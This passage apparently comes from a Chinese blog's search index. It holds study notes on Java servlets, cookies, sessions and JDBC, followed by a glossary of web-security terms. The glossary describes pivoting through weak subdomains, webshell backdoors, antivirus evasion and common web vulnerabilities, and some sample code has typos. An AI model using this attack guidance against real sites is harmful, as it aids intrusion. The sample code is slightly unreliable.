System.out.println(hobby.length);</span><br></pre></td></tr></table></figure><p><strong>请求转发：</strong></p><p>请求转发，是一种服务器的行为，当客户端请求达到后，服务器进行准发，此时会将请求对象进行保存，地址栏中的 URL 地址不会改变，得到响应后，服务端在响应发送给客户端，从始至终只有一个请求发出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.getRequestDispatcher(url).forward(request.response);</span><br></pre></td></tr></table></figure><p><strong>Request 作用域</strong></p><p>通过该对象可以在一个请求中传递数据，作用范围：在一次请求中有效，即服务跳转有效</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置域对象内容</span></span><br><span class="line">request.setAttribute(String name,String value);</span><br><span class="line"><span class="comment">//获取域对象内容</span></span><br><span class="line">request.getAttrbute(String name);</span><br><span class="line"><span class="comment">//删除域对象内容</span></span><br><span class="line">request.removeAttrbute(String name);</span><br></pre></td></tr></table></figure><p>request 域对象中的数据在一次请求中有效，则经过请求转发，request 域中的数据依然存在，则在请求转发的过程中可以通过 request 来传输 &#x2F; 共享数据</p><p><strong>响应数据</strong><br>接收到客户端请求后，可以通过 HttpServletResponse 对象直接进行响应，响应时需要获取输出流。<br>有两种形式:<br>getWriter() 获取字符流 (只能响应回字符)<br>getOutputStream() 获取字节流 (能响应一切数据)</p><p><strong>重定向</strong></p><p>重定向是一种服务器指导，客户端的行为。客户端发出第一个请求，被服务器接收处理后，服务器会进行响应，在响应的同时，服务器会给客户端一个新的地址，当客户端接收到响应后，会立刻、马上、自动根据服务器给的新地址发起二个请求，服务器接收请求并作出响应，重定向完成。</p><pre><code>resp.sendRedirect(&quot;url&quot;);</code></pre><p>请求转发与重定向的区别</p><ul><li><ol><li>请求转发的地址栏不发生改变，重定向的地址会被改变</li></ol></li><li><ol start="2"><li>请求转发是服务端跳转，重定向是客户端跳转</li></ol></li><li><ol start="3"><li>请求转发是一次请求，重定向是两次请求</li></ol></li><li><ol start="4"><li>请求转发是 request 作用域可以共享，重定向是不可以共享</li></ol></li><li><ol start="5"><li>请求转发的地址是跳转到当前项目的资源，重定向可<br>  跳转到任意资源</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/ser03&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servlet03</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;yes.....&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">&quot;servlet...&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//请求转发(服务端)</span></span><br><span class="line"><span class="comment">//        req.getRequestDispatcher(&quot;index.jsp&quot;).forward(req,resp);</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">//重定向 跳转到首页（服务端）</span></span><br><span class="line">                    resp.sendRedirect(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">                    <span class="comment">//跳转到百度</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Cookie 对象</strong><br>通过 new Cookie (“key” “value”); 来创建一个 Cookie 对象，要想将 Cookie 随响应发送到客户端，需要先添加到 response 对象中，response.addCookie (cookie); 此时该 cookie 对象则随着响应发送至了客户端。在浏览器上可以看见</p><p><strong>cookie 获取</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//响应cookie对象</span></span><br><span class="line">resp.addCookie(cookie);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.shsxt.servlet.Cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Cookie</span></span><br><span class="line"><span class="comment">*     是浏览器技术</span></span><br><span class="line"><span class="comment">* Cookie对象的创建与发送</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/cook01&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cookie01</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到Cookie对象</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//响应cookie对象</span></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-6.png"></p><p><strong>Cookie 的路径</strong></p><pre><code>Cookie 的 setPath 设置 cookie 的路径，这个路径直接决定服务器的请求是否会从浏览器中加载某些 cookie。        // 1.当前服务器下，任务项目的任意资源，都可获取Cookie对象        Cookie cookie01=new Cookie(&quot;aa&quot;,&quot;AA&quot;);        cookie01.setPath(&quot;/&quot;);        resp.addCookie(cookie01);//      2.在当前项目下，可以获取cookie对象（默认）        Cookie cookie02=new Cookie(&quot;bb&quot;,&quot;BB&quot;);        cookie02.setPath(&quot;/zhongsheng&quot;);        resp.addCookie(cookie02);//        3.在指定项目下，可获取cookie对象（指定项目站点名：/s05）        Cookie cookie03=new Cookie(&quot;cc&quot;,&quot;CC&quot;);        cookie03.setPath(&quot;/ser05&quot;);        resp.addCookie(cookie03);//        4.在指定项目的指定资源下，以获取cookie对象        Cookie cookie04=new Cookie(&quot;dd&quot;,&quot;DD&quot;);        cookie04.setPath(&quot;/zhongsheng/test&quot;);        resp.addCookie(cookie04);</code></pre><p>Cookie 的 setPath 设置 cookie 的路径，这个路径直接决定服务器的请求是否会从浏览器中加载某些 cookie。<br>*<br>当前项目：站点名为：&#x2F;zhongsheng<br>当前服务域名为：localhost:8080<br>设置路径：setpath (), 默认当前项目的站点名<br>setPath(“&#x2F;zhongsheng”)<br>*</p><ul><li><ol><li>当前服务器下，任务项目的任意资源，都可获取 Cookie 对象</li></ol></li><li>serpath(“&#x2F;”);</li><li><ol start="2"><li>在当前项目下，可以获取 cookie 对象（默认）</li></ol></li><li>setPath（“&#x2F;zhongsheng”）</li><li><ol start="3"><li>在指定项目下，可获取 cookie 对象（指定项目站点名：&#x2F;s05）</li></ol></li><li>setPath（“&#x2F;s05”）</li><li><ol start="4"><li>在指定项目的指定资源下，以获取 cookie 对象<br>setPath（“&#x2F;zhongsheng&#x2F;ser12”）;</li></ol></li></ul><p><strong>HttpSesion 对象</strong></p><p>对于服务器而言，每一个连接到它的客户端都是一个 session，servlet 容器使用此接口创建 HTTP 客户端和 HTTP 服务器之间的会话。会话将保留指定的时间段，跨多个连接或来自用户的页面请求。一个会话通常对应于一个用户，该用户可能多次访问一个站点。可以通过此接口查看和操作有关某个会话的信息，比如会话标识符、创建时间和最后一次访问时间。在整个 session 中，最重要的就是属性的操作。</p><p>session 无论客户端还是服务器端都可以感知到，若重新打开一个新的浏览器，则无法取得之前设置的 session，因为每一个 session 只保存在当前的浏览器当中，并在相关的页面取得。</p><p>Session 的作用就是为了标识一次会话，或者说确认一个用户；并且在一次会话（一个用户的多次请求）期间共享数据。我们可以通过 request.getSession () 方法，来获取当前会话的 session 对象。</p><pre><code>//创建获取SessionHttpSession session =req.getSession();//设置sessiony</code></pre><p><strong>标识符 JSESSIONID</strong></p><p>Session 既然是为了标识一次会话，那么此次会话就应该有一个唯一的标志，这个标志就是 sessionld。</p><p>每当一次请求到达服务器，如果开启了会话 (访问了 session)，服务器第一步会查看是否从客户端回传一个名为 JSESSIONID 的 cookie，如果没有则认为这是一次新的会话，会创建一个新的 session 对象，并用唯一的 sessionld 为此次会话做一个标志。如果有 JESSIONID 这个 cookie 回传，服务器则会根据 JSESSIONID 这个值去查看是否含有 id 为 JSESSION 值的 session 对象，如果没有则认为是一个新的会话，重新创建一个新的 session 对象，并标志此次会话；如果找到了相应的 session 对象，则认为是之前标志过的一次会话共享。</p><p>这里提到一个叫做 JSESSIONID 的 cookie，这是一个比较特殊的 cookie，当用户请求服务器时，如果访问了 session，则服务器会创建一个名为 JSESSIONID，值为获取到的 session (无论是获取到的还是新创建的) 的 sessionld 的 cookie 对象，并添加到 response 对象中，响应给客户端，有效时间为关闭浏览器。</p><p>所以 Session 的底层依赖 Cookie 来实现。</p><pre><code>package com.shsxt.servlet.Session;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.IOException;/*** Session的作用域**    再一次会话中有效*    通过setAttribute(name , value)方法向域对象中添加数据*    通过getAttribute(name)从域对象中获取数据*    通过removeArribute（name）从域对象移除数据**    request作用域*       知在一次请求有效*       只在请求转发跳转有效*    session作用域：*        在一次会话中有效，会话中包含多次请求*        在请求转发与重定向跳转后都有效*        **/@WebServlet(&quot;/ses02&quot;)public class Session02 extends HttpServlet &#123;    @Override    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        //创建获取Session        HttpSession session =req.getSession();        System.out.println(&quot;session02&quot;+session.getId());        //request作用域        req.setAttribute(&quot;requestMsg&quot;,&quot;request的作用域&quot;);        //session作用域        session.setAttribute(&quot;sessionMsg&quot;,&quot;session的作用域&quot;);        //请求转发//        req.getRequestDispatcher(&quot;index.jsp&quot;).forward(req,resp);        //重定向        resp.sendRedirect(&quot;index.jsp&quot;);    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaEE-JDBC</title>
      <link href="/2025/06/17/JavaEE-JDBC/"/>
      <url>/2025/06/17/JavaEE-JDBC/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaEE-JDBC"><a href="#JavaEE-JDBC" class="headerlink" title="JavaEE-JDBC"></a>JavaEE-JDBC</h1><h2 id="什么是-JDBC？"><a href="#什么是-JDBC？" class="headerlink" title="什么是 JDBC？"></a>什么是 JDBC？</h2><p>Java 数据库连接，（Java Database Connectivity，简称 JDBC）是 Java 语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC 也是 Sun Microsystems 的商标。我们通常说的 JDBC 是面向关系型数据库的。</p><p>简而言之，JDBC 就是 JDK 提供的关于数据库操作的一套接口规范，不同数据库厂商来负责实现这个接口，完成指定的操作。</p><p>用程序和数据建立连接，分为三步骤：</p><ol><li><p>连接数据库</p></li><li><p>执行 SQL 语句</p></li><li><p>把查询到的结果集转换成 JAVA 对象</p></li></ol><p>安装 mysql-connector-java.jar 文件</p><p>下载地址（官网）：MySQL :: Download Connector&#x2F;J</p><p>（1）加载驱动程序（通过反射找到对应的 re 包）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载Oracle“驱动类” SPI</span></span><br><span class="line">Class.forName(<span class="string">&quot;oracle.jdbc.driver.OracleDriver&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//加载MySql驱动 SPI</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>)</span><br></pre></td></tr></table></figure><p>（2）获取数据库连接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建“URL连接字符串”。格式：jdbc:oracle:thin:@ 主机名/IP : 端口号 ：服务名称</span></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:oracle:thin:@ip:1521:sid&quot;</span>;  <span class="comment">//oracle</span></span><br><span class="line"><span class="comment">//jdbc:mysql://ip:3306:sid   //mysql</span></span><br><span class="line"><span class="comment">//jdbc:micronsoft:sqlserver://ip:1433:sid    //SqlServer</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建“用户名”</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;scott&quot;</span>;</span><br><span class="line"><span class="comment">// 创建“密码”</span></span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 初始化“数据库连接对象”</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure><p>（3）Statement 对象（对静态 sql 的执行）</p><p>Statement 对象可以用来执行 SQL 语句，使用 executeQuery 执行查询语句，返回结果集，使用 executeUpdate 执行增删改，返回操作的行数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> conn.createStatement();</span><br></pre></td></tr></table></figure><p>（4）结果 ResultSet 进行提取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//取出值</span></span><br><span class="line"><span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">    <span class="type">int</span> id=rs.getInt(columnLabel:<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    String name=rs.getString(columnLabel:<span class="string">&quot;username&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JDBC 预编译</p><p>在 JDBC 中，预编译指的是使用 PreparedStatement 接口来执行 SQL 语句</p><ul><li>性能提升：预编译的 SQL 语句只需要解析一次，可以重复执行多次，减少了数据库解析 SQL 的时间。</li><li>参数化查询：预编译的 SQL 语句可以使用占位符（?）代替实际值，这使得相同的 SQL 语句可以使用不同的参数值执行。</li><li>防止 SQL 注入：预编译的 SQL 语句可以自动转义特殊字符，从而防止 SQL 注入攻击。</li></ul><p>创建预编译 Statement，并把 sql 语句传入，此时 sql 语句已与此 prepareStatement 绑定，所以执行语句时无需再把 sql 语句作为参数传入 execute ()。</p><p>定义预编译的 sql 语句，其中待填入的参数用？占位。注意，? 无关类型，不需要加分号之类。其具体数据类型在下面 setXX（）时决定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into student(id,name,passwd) values(?,?,?)&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。注意：问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）.</span></span><br><span class="line">ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">ps.setString(<span class="number">2</span>, user);</span><br><span class="line">ps.setInt(<span class="number">3</span>, passwd);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Http</title>
      <link href="/2025/06/17/http-base/"/>
      <url>/2025/06/17/http-base/</url>
      
        <content type="html"><![CDATA[<h1 id="Http-和-Https数据包"><a href="#Http-和-Https数据包" class="headerlink" title="Http 和 Https数据包"></a>Http 和 Https数据包</h1><p>可以看此文章：<a href="https://www.runoob.com/w3cnote/http-vs-https.html">https://www.runoob.com/w3cnote/http-vs-https.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概念名词</title>
      <link href="/2025/06/17/Concept-name/"/>
      <url>/2025/06/17/Concept-name/</url>
      
        <content type="html"><![CDATA[<h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="1，域名"><a href="#1，域名" class="headerlink" title="1，域名"></a>1，域名</h2><p>域名（Domain Name）是互联网中用于标识网站的名称，它是一串易于记忆的字符，代替了复杂的 IP 地址，使用户能够更方便地访问互联网上的资源。域名通过将用户输入的文字转换为相应的 IP 地址，帮助用户定位和访问目标网站。‌<br>例如：<a href="http://www.example.com/">www.example.com</a></p><ul><li>顶级域名（TLD）‌：这是域名的最后一部分，例如 “.com”、“.net” 或 “.org”。顶级域名通常代表不同的组织类型或地域。</li><li>二级域名（SLD）‌：紧接在顶级域名前的部分，例如 “example” 在 “example.com” 中就是二级域名。</li><li>‌子域名‌：位于二级域名前面，用于进一步划分域名。例如 “blog.example.com” 中的 “blog” 就是子域名。</li></ul><h3 id="域名发现对于安全测试的意义："><a href="#域名发现对于安全测试的意义：" class="headerlink" title="域名发现对于安全测试的意义："></a>域名发现对于安全测试的意义：</h3><p>某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。</p><p>例如：<a href="http://www.xxxxx.com/">www.xxxxx.com</a> 主域不存在漏洞，并且防御措施严密。<br>而二级域名 edu.xxxxx.com 存在漏洞，并且防护措施松散。</p><p>里面就可能存在漏洞，加以利用可以突破到主站的权限。<br>简单来说，多级域名收集的意义，就是一个网站找不到漏洞时，可以找跟它服务器相同的另一个多级域名上的漏洞，做旁路攻击。<br>这就是旁站入侵。</p><h2 id="2，DNS"><a href="#2，DNS" class="headerlink" title="2，DNS"></a>2，DNS</h2><p>DNS（Domain Name System）是互联网的一项核心服务，其主要功能是将方便记忆的域名（如 example.com）转换为计算机能够识别的 IP 地址（如 192.0.2.1）。这种映射关系使得用户无需记住复杂的数字地址，只需输入域名即可访问目标资源。</p><h3 id="本地-HOSTS-与-DNS-的关系"><a href="#本地-HOSTS-与-DNS-的关系" class="headerlink" title="本地 HOSTS 与 DNS 的关系"></a>本地 HOSTS 与 DNS 的关系</h3><p>本地 HOSTS 重定向解析 IP 地址，如果网络在解析 IP 地址的时候，ping 这个网站的时候，先到 hosts 文件去看看，有没有对域名对应的 IP 地址，没有的话再去 DNS 服务器上去解析。如果去绑定 IP 地址，可以用这个方法，或者修改 hosts 文件，就能让对方指到此 IP 地址上去，类似于钓鱼攻击。<br>hosts 文件所在的位置：C：\Windows\System32\drivers\etc\hosts</p><p>linux 文件所在位置：&#x2F;etc&#x2F;hosts</p><h3 id="CDN-是什么？与-DNS-的关系？"><a href="#CDN-是什么？与-DNS-的关系？" class="headerlink" title="CDN 是什么？与 DNS 的关系？"></a>CDN 是什么？与 DNS 的关系？</h3><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p><p>CDN 作用： 访问的时候找一个网络最好，通讯最快的节点，访问网络时是访问一个节点，用来解决访问速度。</p><p>CDN 缺点： 由于有节点，访问网络时，请求的是一个节点，真实数据和网络相关核心不在节点上，节点相当于缓存。</p><p>两者之间关系： 更改 DNS 服务器，就相当于有可能访问到另一个节点。</p><h3 id="常见的-DNS-攻击"><a href="#常见的-DNS-攻击" class="headerlink" title="常见的 DNS 攻击"></a>常见的 DNS 攻击</h3><h4 id="域名劫持"><a href="#域名劫持" class="headerlink" title="域名劫持"></a>域名劫持</h4><p>通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的 NS 纪录指向到黑客可以控制的 DNS 服务器，然后通过在该 DNS 服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。</p><h4 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h4><p>利用控制 DNS 缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。</p><h4 id="DDOS-攻击"><a href="#DDOS-攻击" class="headerlink" title="DDOS 攻击"></a>DDOS 攻击</h4><p>一种攻击针对 DNS 服务器软件本身，通常利用 BIND 软件程序中的漏洞，导致 DNS 服务器崩溃或拒绝服务；另一种攻击的目标不是 DNS 服务器，而是利用 DNS 服务器作为中间的 “攻击放大器”，去攻击其它互联网上的主机，导致被攻击主机拒绝服务。</p><h4 id="DNS-欺骗"><a href="#DNS-欺骗" class="headerlink" title="DNS 欺骗"></a>DNS 欺骗</h4><p>DNS 欺骗就是攻击者冒充域名服务器的一种欺骗行为。</p><h2 id="3，HTTP-和-HTTPS-区别"><a href="#3，HTTP-和-HTTPS-区别" class="headerlink" title="3，HTTP 和 HTTPS 区别"></a>3，HTTP 和 HTTPS 区别</h2><ul><li>‌安全性‌：HTTP 是明文传输，HTTPS 通过加密保护数据。</li><li>‌证书‌：HTTPS 需要 CA 颁发的证书，而 HTTP 不需要。</li><li>HTTPS 由于加密和解密过程，可能比 HTTP 稍慢，但现代技术已大大缩小了这一差距。</li></ul><h2 id="4，后门"><a href="#4，后门" class="headerlink" title="4，后门"></a>4，后门</h2><p>后门：可以理解为攻击者，在得到相关的非法入侵后，留下后门文件，便于下次进行操作，拿到权限。<br>后门文件：网站后门 (webshell)，服务器后门等其他类型的后门。</p><p>关于后门需要了解哪些？（玩法，免杀）<br>玩法（要能够隐藏自己），免杀（网站有杀毒软件，大部分有杀后门功能，会检测并删除，免杀就是不被检测到）</p><h2 id="5，WEB"><a href="#5，WEB" class="headerlink" title="5，WEB"></a>5，WEB</h2><p>网站源码：分脚本类型、分应用方向<br>操作系统：windows、linux<br>中间件（搭建平台）：apache、iis、tomcat、nginx 等<br>数据库：access、mysql、mssql、oracle、sybase、db2、postsql 等</p><p><strong>WEB 相关安全漏洞</strong></p><p>1、SQL 注入</p><p>SQL 注入攻击的核心在于让 Web 服务器执行攻击者期望的 SQL 语句，以便得到数据库中的感兴趣的数据或对数据库进行读取、修改、删除、插入等操作，达到其邪恶的目的。</p><p>2、XSS 攻击</p><p>XSS 攻击的核心是将可执行的前端脚本代码（一般为 JavaScript）植入到网页中，听起来比较拗口，用大白话说就是攻击者想让你的浏览器执行他写的 JS 代码</p><p>3、CSRF 攻击</p><p>CSRF，跨站请求伪造，其核心思想在于，在打开 A 网站的情况下，另开 Tab 页面打开恶意网站 B，此时在 B 页面的 “唆使” 下，浏览器发起一个对网站 A 的 HTTP 请求</p><p>4、DDoS 攻击</p><p>DDoS 全称 Distributed Denial of Service：分布式拒绝服务攻击。是拒绝服务攻击的升级版。拒绝攻击服务顾名思义，让服务不可用。</p><p>5、DNS 劫持</p><p>6、JSON 劫持</p><p>JSON 是一种轻量级的数据交换格式，而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适。恶意攻击者通过某些特定的手段，将本应该返回给用户的 JSON 数据进行拦截，转而将数据发送回给恶意攻击者</p><p>7、暴力破解</p><p>8、信息泄露</p><p>由于 Web 服务器或应用程序没有正确处理一些特殊请求，泄露 Web 服务器的一些敏感信息，如用户名、密码、源代码、服务器信息、配置信息等。</p><p>9、目录遍历漏洞</p><p>攻击者向 Web 服务器发送请求，通过在 URL 中或在有特殊意义的目录中附加 ..&#x2F;、或者附加 ..&#x2F; 的一些变形（如 ..\ 或 ..&#x2F;&#x2F; 甚至其编码），导致攻击者能够访问未授权的目录，以及在 Web 服务器的根目录以外执行命令。</p><p>10，命令执行漏洞</p><p>命令执行漏洞是通过 URL 发起请求，在 Web 服务器端执行未授权的命令，获取系统信息、篡改系统配置、控制整个系统、使系统瘫痪等。</p><p>11、文件上传漏洞</p><p>如果对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。</p><p>12、其他漏洞</p><p>SSLStrip 攻击<br>OpenSSL Heartbleed 安全漏洞<br>CCS 注入漏洞<br>证书有效性验证漏洞<br>13、业务漏洞</p><p>一般业务漏洞是跟具体的应用程序相关，比如参数篡改（连续编号 ID &#x2F; 订单、1 元支付）、重放攻击（伪装支付）、权限控制（越权操作）等。</p><p>14、框架或应用漏洞</p><p>15，XEE 漏洞</p><p>XXE 漏洞全称 XML External Entity Injection 即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos 攻击等危害。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
